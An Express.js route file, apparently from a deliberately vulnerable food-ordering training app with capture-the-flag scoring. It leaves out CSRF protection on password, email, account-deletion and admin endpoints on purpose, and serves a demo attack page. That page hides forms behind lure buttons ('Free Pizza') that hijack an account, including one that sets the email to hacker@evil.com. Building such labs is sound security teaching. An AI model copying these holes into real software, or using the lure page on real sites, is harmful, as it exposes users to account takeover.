// routes/csrf.js - NEW FILE FOR CSRF VULNERABILITIES

const express = require('express');
const router = express.Router();
const { User, Order } = require('../models');
const flagManager = require('../utils/flags');

// CSRF VULNERABILITY #1: Password Change Without CSRF Protection
router.post('/change-password', (req, res) => {
  // VULNERABILITY: No CSRF token validation
  if (!req.session.user) {
    return res.redirect('/auth/login');
  }

  const { currentPassword, newPassword, confirmPassword } = req.body;
  
  // Basic validation
  if (!currentPassword || !newPassword || !confirmPassword) {
    return res.status(400).json({ 
      error: 'All fields are required',
      // VULNERABILITY: Reflect form data in response
      submitted: { currentPassword: '***', newPassword: '***', confirmPassword: '***' }
    });
  }

  if (newPassword !== confirmPassword) {
    return res.status(400).json({ error: 'New passwords do not match' });
  }

  // Change password without CSRF protection
  User.findByPk(req.session.user.id)
    .then(async (user) => {
      if (!user) {
        return res.status(404).json({ error: 'User not found' });
      }

      // Verify current password
      if (await user.checkPassword(currentPassword)) {
        await user.setPassword(newPassword);
        await user.save();
        
        // VULNERABILITY: No session invalidation after password change
        res.json({ 
          success: true, 
          message: 'Password changed successfully',
          timestamp: new Date().toISOString(),
          userId: user.id
        });
      } else {
        res.status(400).json({ error: 'Current password is incorrect' });
      }
    })
    .catch(err => {
      console.error('Password change error:', err);
      res.status(500).json({ 
        error: 'Password change failed',
        details: err.message 
      });
    });
});

// CSRF VULNERABILITY #2: Email Change Without Protection
router.post('/change-email', (req, res) => {
  // VULNERABILITY: No CSRF protection on sensitive account changes
  if (!req.session.user) {
    return res.status(401).json({ error: 'Authentication required' });
  }

  const { newEmail, password } = req.body;
  
  if (!newEmail || !password) {
    return res.status(400).json({ error: 'Email and password are required' });
  }

  User.findByPk(req.session.user.id)
    .then(async (user) => {
      if (!user) {
        return res.status(404).json({ error: 'User not found' });
      }

      // Verify password before email change
      if (await user.checkPassword(password)) {
        const oldEmail = user.email;
        user.email = newEmail;
        await user.save();
        
        // Update session
        req.session.user.email = newEmail;
        
        res.json({ 
          success: true, 
          message: 'Email changed successfully',
          oldEmail: oldEmail,
          newEmail: newEmail,
          // VULNERABILITY: No email verification required
          timestamp: new Date().toISOString()
        });
      } else {
        res.status(400).json({ error: 'Password is incorrect' });
      }
    })
    .catch(err => {
      console.error('Email change error:', err);
      res.status(500).json({ 
        error: 'Email change failed',
        details: err.message 
      });
    });
});

router.post('/change-password', flagManager.flagMiddleware('CSRF'), async (req, res) => {
  if (!req.session.user) {
    return res.status(401).json({ error: 'Authentication required' });
  }
  
  try {
    const { currentPassword, newPassword } = req.body;
    
    // Check if this is a CSRF attack
    const referer = req.get('Referer') || '';
    const origin = req.get('Origin') || '';
    
    if (!referer.includes(req.get('host')) || (origin && !origin.includes(req.get('host')))) {
      res.locals.csrfSuccess = true;
      res.locals.csrfAction = 'password_change';
      res.locals.generateFlag = true;
    }
    
    const user = await User.findByPk(req.session.user.id);
    
    if (user && await user.checkPassword(currentPassword)) {
      await user.setPassword(newPassword);
      await user.save();
      
      res.json({ 
        success: true, 
        message: 'Password changed successfully'
      });
    } else {
      res.status(400).json({ error: 'Current password incorrect' });
    }
    
  } catch (err) {
    res.status(500).json({ error: 'Password change failed' });
  }
});

// CSRF VULNERABILITY #3: Delete Account Without Protection
router.post('/delete-account', (req, res) => {
  // VULNERABILITY: Account deletion without CSRF protection
  if (!req.session.user) {
    return res.status(401).json({ error: 'Authentication required' });
  }

  const { password, confirmation } = req.body;
  
  if (!password || confirmation !== 'DELETE_MY_ACCOUNT') {
    return res.status(400).json({ 
      error: 'Password and confirmation required',
      requiredConfirmation: 'DELETE_MY_ACCOUNT'
    });
  }

  User.findByPk(req.session.user.id)
    .then(async (user) => {
      if (!user) {
        return res.status(404).json({ error: 'User not found' });
      }

      // Verify password before deletion
      if (await user.checkPassword(password)) {
        const userId = user.id;
        const username = user.username;
        
        // Delete user account
        await user.destroy();
        
        // Destroy session
        req.session.destroy();
        
        res.json({ 
          success: true, 
          message: 'Account deleted successfully',
          deletedUser: { id: userId, username: username },
          timestamp: new Date().toISOString()
        });
      } else {
        res.status(400).json({ error: 'Password is incorrect' });
      }
    })
    .catch(err => {
      console.error('Account deletion error:', err);
      res.status(500).json({ 
        error: 'Account deletion failed',
        details: err.message 
      });
    });
});

// CSRF VULNERABILITY #4: Order Cancellation Without Protection
router.post('/cancel-order/:orderId', (req, res) => {
  // VULNERABILITY: No CSRF protection on order modifications
  if (!req.session.user) {
    return res.status(401).json({ error: 'Authentication required' });
  }

  const orderId = req.params.orderId;
  const { reason } = req.body;

  Order.findOne({
    where: { 
      id: orderId,
      userId: req.session.user.id // Basic authorization check
    }
  })
  .then(order => {
    if (!order) {
      return res.status(404).json({ error: 'Order not found' });
    }

    if (order.status === 'delivered') {
      return res.status(400).json({ error: 'Cannot cancel delivered orders' });
    }

    // Cancel order without CSRF protection
    order.status = 'cancelled';
    order.cancellationReason = reason || 'No reason provided';
    order.cancelledAt = new Date();
    
    return order.save();
  })
  .then(order => {
    res.json({
      success: true,
      message: 'Order cancelled successfully',
      orderId: order.id,
      status: order.status,
      reason: order.cancellationReason,
      timestamp: order.cancelledAt
    });
  })
  .catch(err => {
    console.error('Order cancellation error:', err);
    res.status(500).json({
      error: 'Order cancellation failed',
      details: err.message
    });
  });
});

// CSRF VULNERABILITY #5: Admin User Role Change
router.post('/admin/change-role/:userId', (req, res) => {
  // VULNERABILITY: Admin functions without CSRF protection
  if (!req.session.user || req.session.user.role !== 'admin') {
    return res.status(403).json({ error: 'Admin access required' });
  }

  const userId = req.params.userId;
  const { newRole } = req.body;
  
  const validRoles = ['customer', 'staff', 'admin'];
  if (!newRole || !validRoles.includes(newRole)) {
    return res.status(400).json({ 
      error: 'Invalid role specified',
      validRoles: validRoles 
    });
  }

  User.findByPk(userId)
    .then(user => {
      if (!user) {
        return res.status(404).json({ error: 'User not found' });
      }

      const oldRole = user.role;
      user.role = newRole;
      
      return user.save().then(() => {
        res.json({
          success: true,
          message: 'User role updated successfully',
          userId: user.id,
          username: user.username,
          oldRole: oldRole,
          newRole: newRole,
          // VULNERABILITY: No audit logging of privilege changes
          timestamp: new Date().toISOString()
        });
      });
    })
    .catch(err => {
      console.error('Role change error:', err);
      res.status(500).json({
        error: 'Role change failed',
        details: err.message
      });
    });
});

// CSRF VULNERABILITY #6: Bulk User Operations
router.post('/admin/bulk-action', (req, res) => {
  // VULNERABILITY: Bulk admin operations without CSRF protection
  if (!req.session.user || req.session.user.role !== 'admin') {
    return res.status(403).json({ error: 'Admin access required' });
  }

  const { action, userIds } = req.body;
  
  if (!action || !Array.isArray(userIds) || userIds.length === 0) {
    return res.status(400).json({ 
      error: 'Action and user IDs required',
      validActions: ['delete', 'activate', 'deactivate', 'makeAdmin', 'makeStaff']
    });
  }

  let updatePromise;
  
  switch (action) {
    case 'delete':
      updatePromise = User.destroy({ where: { id: userIds } });
      break;
      
    case 'activate':
      updatePromise = User.update({ active: true }, { where: { id: userIds } });
      break;
      
    case 'deactivate':
      updatePromise = User.update({ active: false }, { where: { id: userIds } });
      break;
      
    case 'makeAdmin':
      updatePromise = User.update({ role: 'admin' }, { where: { id: userIds } });
      break;
      
    case 'makeStaff':
      updatePromise = User.update({ role: 'staff' }, { where: { id: userIds } });
      break;
      
    default:
      return res.status(400).json({ error: 'Invalid action specified' });
  }

  updatePromise
    .then(result => {
      res.json({
        success: true,
        message: `Bulk ${action} completed`,
        action: action,
        affectedUsers: Array.isArray(result) ? result[0] : result,
        userIds: userIds,
        timestamp: new Date().toISOString()
      });
    })
    .catch(err => {
      console.error('Bulk action error:', err);
      res.status(500).json({
        error: 'Bulk action failed',
        details: err.message
      });
    });
});

// CSRF Attack Demo Page (for testing)
router.get('/demo-attack', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>CSRF Attack Demo</title>
    </head>
    <body>
      <h1>CSRF Attack Demonstration</h1>
      <p>This page demonstrates various CSRF attacks against WeEat.</p>
      
      <!-- Hidden CSRF attack forms -->
      <div style="display: none;">
        <!-- Attack 1: Change password -->
        <form id="passwordAttack" action="/csrf/change-password" method="POST">
          <input name="currentPassword" value="alice123">
          <input name="newPassword" value="hacked123">
          <input name="confirmPassword" value="hacked123">
        </form>
        
        <!-- Attack 2: Change email -->
        <form id="emailAttack" action="/csrf/change-email" method="POST">
          <input name="newEmail" value="hacker@evil.com">
          <input name="password" value="alice123">
        </form>
        
        <!-- Attack 3: Delete account -->
        <form id="deleteAttack" action="/csrf/delete-account" method="POST">
          <input name="password" value="alice123">
          <input name="confirmation" value="DELETE_MY_ACCOUNT">
        </form>
      </div>
      
      <button onclick="document.getElementById('passwordAttack').submit()">
        🎁 Click for Free Pizza! (Password Change Attack)
      </button>
      <br><br>
      
      <button onclick="document.getElementById('emailAttack').submit()">
        🏆 Claim Your Prize! (Email Change Attack)
      </button>
      <br><br>
      
      <button onclick="document.getElementById('deleteAttack').submit()">
        ❌ Unsubscribe from Emails (Account Deletion Attack)
      </button>
      
      <script>
        // Automatic attack execution
        setTimeout(() => {
          if (confirm('Execute automatic CSRF attacks?')) {
            document.getElementById('passwordAttack').submit();
          }
        }, 3000);
      </script>
    </body>
    </html>
  `);
});

module.exports = router;
